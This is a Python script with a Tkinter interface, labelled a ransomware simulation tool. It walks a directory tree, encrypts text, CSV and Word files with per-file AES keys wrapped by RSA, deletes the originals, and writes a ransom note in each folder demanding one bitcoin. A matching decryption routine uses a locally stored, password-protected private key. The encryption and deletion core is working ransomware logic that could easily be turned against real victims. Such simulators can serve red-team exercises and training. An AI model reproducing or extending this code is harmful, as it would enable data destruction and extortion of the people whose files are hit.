import os
import tkinter as tk
from tkinter import filedialog, messagebox
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from hashlib import sha256
import base64
import datetime
import time

# === Core Ransomware Functions ===

def digestSHA256(data):
    return sha256(data).digest()

def newRSAKeyPair():
    key = RSA.generate(2048)
    return key.export_key(), key.publickey().export_key()

def undoSerializeKey(key_bytes):
    return RSA.import_key(key_bytes)

def storeKeyPEM(key_bytes, password, path=""):
    fname = 'private.pem'
    try:
        key=RSA.import_key(key_bytes)
        encrypted_key=key.export_key( 
            passphrase=password,
            pkcs=8,
            protection="scryptAndAES128-CBC"
            )
        os.makedirs(path,exist_ok=True)
        with open(os.path.join(path, fname), 'wb') as f:
            f.write(encrypted_key)
    except Exception as e:
        print(e)
        return -1
    return 1

def loadKeyPEM(password,path=""):
    fname = 'private.pem'
    try:
        with open(os.path.join(path, fname), 'rb') as f:
            key_data = f.read()
            return RSA.import_key(key_data,passphrase=password)
    except Exception as e:
        print(e)
        return None

def encryptRSA(pub_key, data):
    cipher = PKCS1_OAEP.new(pub_key)
    return cipher.encrypt(data)

def decryptRSA(priv_key, ciphertext):
    cipher = PKCS1_OAEP.new(priv_key)
    return cipher.decrypt(ciphertext)

def encryptAES(data, key, nonce):
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    return cipher.encrypt(data)

def decryptAES(ciphertext, key, nonce):
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    return cipher.decrypt(ciphertext)

def encryptFile(dir, f, pub_key_bytes):
    chunkSize = 64 * 1024
    pub_key = undoSerializeKey(pub_key_bytes)
    outFile = os.path.join(dir, "encrypted_" + os.path.basename(f))
    filepath = os.path.join(dir, f)
    filesize = str(os.path.getsize(filepath)).zfill(16)
    key = get_random_bytes(32)
    nonce = get_random_bytes(8)
    cipher_key = encryptRSA(pub_key,key)
    print(f"Cipher key length: {len(cipher_key)}")

    try:
        with open(filepath, "rb") as infile, open(outFile, "wb") as outfile:
            outfile.write(filesize.encode())
            outfile.write(cipher_key)
            outfile.write(nonce)
            while True:
                chunk = infile.read(chunkSize)
                if len(chunk) == 0:
                    break
                #elif len(chunk) % 16 != 0:
                    #chunk += b' ' * (16 - len(chunk) % 16)
                outfile.write(encryptAES(chunk, key, nonce))
        os.remove(filepath)
        return True
    except Exception as e:
        print(e)
        return False

def decryptFile(dir, f, priv_key):
    chunkSize = 64 * 1024
    #outFile = os.path.join(dir, os.path.basename(f[10:]))
    original_name=os.path.basename(f[10:])
    outFile=os.path.join(dir,"restored_"+original_name)

    try:
        with open(os.path.join(dir, f), "rb") as infile, open(outFile, "wb") as out:
            filesize = infile.read(16)
            sim_key = decryptRSA(priv_key, infile.read(256))
            nonce = infile.read(8)
            while True:
                chunk = infile.read(chunkSize)
                if len(chunk) == 0:
                    break
                out.write(decryptAES(chunk, sim_key, nonce))
            out.truncate(int(filesize))
        enc_file_path=os.path.join(dir,f)
        os.remove(enc_file_path)
        return True
    except Exception as e:
        print(e)
        return False

def encryptDirectoryTree(dir, pub_key):
    total, encrypted = 0, 0
    for root, _, files in os.walk(dir):
        for f in files:
            if f.startswith("encrypted_") or f == "READ_ME.txt":
                continue
            if f.endswith(('.txt', '.csv', '.docx')):
                if encryptFile(root, f, pub_key):
                    encrypted += 1
                total += 1
        ransom_note = os.path.join(root, "READ_ME.txt")
        with open(ransom_note, "w") as note:
            note.write("YOUR FILES HAVE BEEN ENCRYPTED!\n\nSend 1 BTC to the following address:\nxyz123abc\nThen email proof of payment to decrypt@fakeemail.com\n")
    return total, encrypted

def decryptDirectoryTree(dir, priv_key):
    total, decrypted = 0, 0
    for root, _, files in os.walk(dir):
        for f in files:
            if f.startswith("encrypted_"):
                if decryptFile(root, f, priv_key):
                    decrypted += 1
                total += 1
        ransome_path=os.path.join(root,"READ_ME.txt")
        if os.path.isfile(ransome_path):
            try:
                os.remove(ransome_path)
            except Exception as e:
                print(f"failed to delete ransome note: {e}")
    return total, decrypted

# === GUI ===

def encrypt_directory():
    directory = path_entry.get().strip()
    password = password_entry.get().strip()

    if not os.path.isdir(directory):
        messagebox.showerror("Error", "Invalid directory path!")
        return

    if not password:
        messagebox.showerror("Error", "Password is required.")
        return


    start = time.time()
    #hashed_password = digestSHA256(password.encode())
    priv_key, pub_key = newRSAKeyPair()
    storeKeyPEM(priv_key,password, path=os.path.join(os.getcwd(),"keys"))
    total, encrypted = encryptDirectoryTree(directory, pub_key)
    end = time.time()

    messagebox.showinfo("Encryption Complete", f"Encrypted {encrypted} of {total} files.\nTime: {datetime.timedelta(seconds=end - start)}")

def decrypt_directory():
    directory = path_entry.get().strip()
    password = password_entry.get().strip()

    if not os.path.isdir(directory):
        messagebox.showerror("Error", "Invalid directory path!")
        return

    if not password:
        messagebox.showerror("Error", "Password is required.")
        return

    start = time.time()
    priv_key = loadKeyPEM(password,path=os.path.join(os.getcwd(),"keys"))
    if priv_key is None:
        messagebox.showerror("Error", "Failed to load private key.")
        return

    total, decrypted = decryptDirectoryTree(directory, priv_key)
    end = time.time()

    messagebox.showinfo("Decryption Complete", f"Decrypted {decrypted} of {total} files.\nTime: {datetime.timedelta(seconds=end - start)}")

def browse_directory():
    selected_dir = filedialog.askdirectory()
    if selected_dir:
        path_entry.delete(0, tk.END)
        path_entry.insert(0, selected_dir)

# === Launch GUI ===

window = tk.Tk()
window.title("Ransomware Simulation Tool")
window.geometry("500x300")
window.resizable(False, False)

tk.Label(window, text="Directory Path (can be UNC):").pack(pady=5)
path_entry = tk.Entry(window, width=60)
path_entry.pack(pady=5)
tk.Button(window, text="Browse", command=browse_directory).pack(pady=5)

tk.Label(window, text="Encryption Password:").pack(pady=5)
password_entry = tk.Entry(window, show="*", width=40)
password_entry.pack(pady=5)

tk.Button(window, text="Encrypt Directory", command=encrypt_directory, bg='red', fg='white').pack(pady=10)
tk.Button(window, text="Decrypt Directory", command=decrypt_directory, bg='green', fg='white').pack(pady=5)

window.mainloop()
